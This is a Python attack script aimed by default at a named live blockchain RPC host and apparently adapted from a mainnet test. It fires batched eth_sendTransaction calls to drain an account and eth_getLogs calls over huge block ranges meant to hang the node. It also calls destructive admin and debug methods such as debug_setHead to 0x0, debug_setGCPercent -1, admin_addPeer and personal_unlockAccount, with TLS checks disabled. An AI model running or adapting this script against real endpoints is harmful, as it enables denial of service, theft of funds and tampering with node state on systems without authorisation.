#!/usr/bin/env python3
"""
WebSocket + Batch RPC + getLogs DoS + Custom Methods Fuzzer for Blockchain RPC Endpoints
Adapted from MultiVAC mainnet fuzz 2026-08-17.

Usage: python3 advanced_fuzz.py <RPC_HOST> [RPC_PORT] [USE_SSL]
Default: rpc.mtv.ac 443 true

Tests:
  - WebSocket endpoint discovery (ws:// and wss:// root + /ws, /websocket, /wss)
  - Batch JSON-RPC (100, 200, 500 requests + mixed methods)
  - eth_getLogs with massive block range (DoS test)
  - Custom/l/Namespace method enumeration
  - Error revelation (malformed, type confusion, OOM)
"""
import json
import requests
import socket
import ssl
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "rpc.mtv.ac"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 443
USE_SSL = sys.argv[3].lower() != "false" if len(sys.argv) > 3 else True
RPC_URL = f"https://{HOST}" if USE_SSL else f"http://{HOST}:{PORT}"
UA = "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
HEADERS = {"Content-Type": "application/json", "User-Agent": UA}
MAX_UINT = "0x" + "f" * 64
results = []

def log(test, cat, status, body, exploit):
    results.append({"test": test, "category": cat, "status": str(status), "body": body[:500] if body else "", "exploitability": exploit})
    print(f"\n{'='*60}\nTEST: {test}\nCAT: {cat}\nSTATUS: {status}\nBODY: {body[:300] if body else ''}\nEXPLOIT: {exploit}\n{'='*60}")

def rpc(method, params, id=1):
    try:
        r = requests.post(RPC_URL, json={"jsonrpc":"2.0","method":method,"params":params,"id":id}, headers=HEADERS, timeout=20)
        return r.status_code, r.text
    except Exception as e:
        return -1, str(e)

# === WEBSOCKET DISCOVERY ===
print("### WEBSOCKET DISCOVERY ###")
def test_ws(host, port, path, use_ssl=True):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        ssock = ctx.wrap_socket(sock, server_hostname=host) if use_ssl else sock
        ssock.connect((host, port))
        req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUpgrade: websocket\r\n"
               "Connection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
               f"Sec-WebSocket-Version: 13\r\nUser-Agent: {UA}\r\n\r\n")
        ssock.send(req.encode())
        resp = b""
        try:
            while True:
                d = ssock.recv(4096)
                if not d: break
                resp += d
        except socket.timeout: pass
        ssock.close()
        return resp.decode('utf-8', errors='replace')
    except Exception as e:
        return f"ERROR: {e}"

for proto, port, ssl_flag in [("ws", 80, False), ("wss", 443, True)]:
    r = test_ws(HOST, port, "/", ssl_flag)
    status = r.split('\r\n')[0] if r and r != f"ERROR: {r}" else "NO_RESPONSE"
    log(f"{proto}://{HOST}:{port}/ WebSocket", "WebSocket", status, r, "CRITICAL - 200 may indicate WS upgrade accepted")

for path in ["/ws", "/websocket", "/wss"]:
    r = test_ws(HOST, 443, path, True)
    log(f"wss://{HOST}{path} WebSocket", "WebSocket", r.split('\r\n')[0] if r else "NO_RESPONSE", r, "MEDIUM")

# === BATCH RPC ===
print("\n### BATCH RPC ###")
for size in [100, 200, 500]:
    batch = [{"jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": i} for i in range(size)]
    try:
        r = requests.post(RPC_URL, json=batch, headers=HEADERS, timeout=30)
        log(f"Batch RPC {size} requests", "Batch RPC", r.status_code, r.text[:500],
            f"HIGH - {'no batch limit' if r.status_code == 200 else 'rejected'}")
    except Exception as e:
        log(f"Batch RPC {size} requests", "Batch RPC", -1, str(e), "ERROR")

# Mixed batch (standard + admin/debug/personal)
mixed = [
    {"jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": 1},
    {"jsonrpc": "2.0", "method": "admin_nodeInfo", "params": [], "id": 2},
    {"jsonrpc": "2.0", "method": "debug_traceBlock", "params": ["0x0"], "id": 3},
    {"jsonrpc": "2.0", "method": "personal_listAccounts", "params": [], "id": 4},
    {"jsonrpc": "2.0", "method": "miner_start", "params": [], "id": 5},
    {"jsonrpc": "2.0", "method": "txpool_status", "params": [], "id": 6},
    {"jsonrpc": "2.0", "method": "eth_accounts", "params": [], "id": 7},
]
try:
    r = requests.post(RPC_URL, json=mixed, headers=HEADERS, timeout=30)
    log("Batch mixed (admin/debug/personal/miner/txpool)", "Batch RPC", r.status_code, r.text[:500],
        "HIGH - reveals which methods are available")
except Exception as e:
    log("Batch mixed", "Batch RPC", -1, str(e), "ERROR")

# Batch sendTransaction
batch_send = [{"jsonrpc": "2.0", "method": "eth_sendTransaction", "params": [{
    "from": "0x2781bcbdad5c702eb9258d82ac32a94f3db95e69",
    "to": "0x" + "0"*40, "value": "0x1"}], "id": i} for i in range(10)]
try:
    r = requests.post(RPC_URL, json=batch_send, headers=HEADERS, timeout=30)
    log("Batch 10x eth_sendTransaction (amplification)", "Batch RPC", r.status_code, r.text[:500],
        "CRITICAL - batch send could amplify account drainage")
except Exception as e:
    log("Batch 10x sendTransaction", "Batch RPC", -1, str(e), "ERROR")

# === eth_getLogs MASSIVE RANGE ===
print("\n### eth_getLogs ###")
for desc, params in [
    ("full range (0x0 to latest)", {"fromBlock": "0x0", "toBlock": "latest"}),
    ("massive range (0x0 to 0x338bd9a)", {"fromBlock": "0x0", "toBlock": "0x338bd9a"}),
    ("negative fromBlock", {"fromBlock": "-0x1", "toBlock": "0x100"}),
    ("reverse range (from > to)", {"fromBlock": "0x100", "toBlock": "0x0"}),
    ("overflow range (0 to max uint256)", {"fromBlock": "0x0", "toBlock": MAX_UINT}),
]:
    s, b = rpc("eth_getLogs", [params])
    log(f"eth_getLogs {desc}", "getLogs", s, b,
        "HIGH - DoS: timeout means node hung" if s == -1 else "INFO")

# === CUSTOM METHODS ===
print("\n### Custom Methods ###")
custom = [
    ("eth_chainId", [], "INFO"), ("eth_protocolVersion", [], "INFO"),
    ("net_listening", [], "INFO"), ("web3_clientVersion", [], "INFO"),
    ("web3_sha3", ["0x68656c6c6f20776f726c64"], "INFO"),
    # Custom namespaces
    ("mtv_blockNumber", [], "MEDIUM"), ("mtv_getNodeInfo", [], "HIGH"),
    ("multivac_getNodeInfo", [], "MEDIUM"), ("mtv_getStats", [], "HIGH"),
    ("bft_getValidators", [], "HIGH"), ("consensus_getValidators", [], "HIGH"),
    ("shard_getShards", [], "HIGH"), ("shard_getInfo", [], "HIGH"),
    # Geth namespaces
    ("admin_nodeInfo", [], "HIGH"), ("admin_peers", [], "HIGH"),
    ("admin_datadir", [], "HIGH"), ("admin_addPeer", ["enode://fake@1.2.3.4:30303"], "CRITICAL"),
    ("debug_stacks", [], "HIGH"), ("debug_setHead", ["0x0"], "CRITICAL"),
    ("debug_writeMemProfile", ["/tmp/pwn_test"], "HIGH"),
    ("debug_setGCPercent", [-1], "HIGH"),
    ("personal_listAccounts", [], "CRITICAL"), ("personal_unlockAccount", ["0x0", "pass", 300], "CRITICAL"),
    ("txpool_status", [], "HIGH"), ("txpool_content", [], "HIGH"),
]
for method, params, exploit in custom:
    s, b = rpc(method, params)
    log(f"Custom: {method}", "Custom Methods", s, b, exploit)
    time.sleep(0.2)

# === ERROR REVELATION ===
print("\n### Error Revelation ###")
s, b = rpc("eth_call", None)
log("eth_call null params", "Error Rev", s, b, "MEDIUM - may reveal stack trace")
s, b = rpc("eth_call", ["just_a_string", "latest"])
log("eth_call string param (type confusion)", "Error Rev", s, b, "MEDIUM - Go struct leak")
s, b = rpc("eth_call", [{"to": "0x" + "ff"*40, "data": "0x"}, "latest"])
log("eth_call oversized address", "Error Rev", s, b, "INFO")
try:
    r = requests.post(RPC_URL, data="not_json", headers=HEADERS, timeout=15)
    log("Malformed non-JSON POST", "Error Rev", r.status_code, r.text, "MEDIUM - server type leak")
except Exception as e:
    log("Malformed non-JSON POST", "Error Rev", -1, str(e), "ERROR")
try:
    r = requests.post(RPC_URL, json={}, headers=HEADERS, timeout=15)
    log("Empty JSON", "Error Rev", r.status_code, r.text, "LOW")
except Exception as e:
    log("Empty JSON", "Error Rev", -1, str(e), "ERROR")

with open("advanced_fuzz_results.json", "w") as f:
    json.dump(results, f, indent=2)
print(f"\nTotal tests: {len(results)}\nResults: advanced_fuzz_results.json")
